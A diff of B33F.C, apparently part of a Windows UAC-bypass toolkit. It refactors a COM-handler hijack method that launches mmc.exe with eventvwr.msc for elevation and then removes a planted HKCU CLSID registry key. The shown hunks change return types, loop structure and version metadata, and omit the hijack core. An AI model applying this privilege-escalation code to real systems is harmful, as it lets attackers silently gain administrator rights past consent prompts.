@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2018
+*  (C) COPYRIGHT AUTHORS, 2017 - 2019
 *
 *  TITLE:       B33F.C
 *
-*  VERSION:     3.11
+*  VERSION:     3.17
 *
-*  DATE:        23 Nov 2018
+*  DATE:        18 Mar 2019
 *
 *  UAC bypass method from Ruben Boonen aka b33f.
 *
@@ -27,12 +27,13 @@
 * https://github.com/FuzzySecurity/DefCon25/blob/master/DefCon25_UAC-0day-All-Day_v1.2.pdf
 *
 */
-BOOL ucmCOMHandlersMethod(
+NTSTATUS ucmCOMHandlersMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL     bCond = FALSE, bResult = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
     SIZE_T   sz = 0;
     HKEY     hKey = NULL;
     LRESULT  lResult;
@@ -156,9 +157,10 @@ BOOL ucmCOMHandlersMethod(
         //
         // Run target app.
         //
-        bResult = supRunProcess(MMC_EXE, EVENTVWR_MSC);
+        if (supRunProcess(MMC_EXE, EVENTVWR_MSC))
+            MethodResult = STATUS_SUCCESS;
 
-    } while (bCond);
+    } while (FALSE);
 
     if (hKey != NULL)
         RegCloseKey(hKey);
@@ -166,7 +168,7 @@ BOOL ucmCOMHandlersMethod(
     //
     // Cleanup.
     //
-    if (bResult) {
+    if (NT_SUCCESS(MethodResult)) {
         RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
         _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
         _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASS);
@@ -185,5 +187,5 @@ BOOL ucmCOMHandlersMethod(
         RegDeleteKey(HKEY_CURRENT_USER, szRegBuffer);
     }
 
-    return bResult;
+    return MethodResult;
 }
